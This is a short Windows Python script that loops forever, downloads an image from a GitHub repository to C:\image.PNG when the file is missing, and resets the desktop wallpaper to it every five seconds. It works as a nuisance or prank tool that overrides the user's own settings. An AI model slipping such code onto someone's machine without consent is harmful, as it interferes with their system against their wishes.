import requests
import os.path
import ctypes
from time import sleep


while True:
    
    if os.path.isfile("C:\image.PNG") == False:
        url = 'https://raw.githubusercontent.com/Calvin-CoolestYT/SODv2/main/image.PNG'
        r = requests.get(url, allow_redirects=True)
        open('C:\image.PNG', 'wb').write(r.content)

    ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\image.PNG", 0)

    sleep(5)

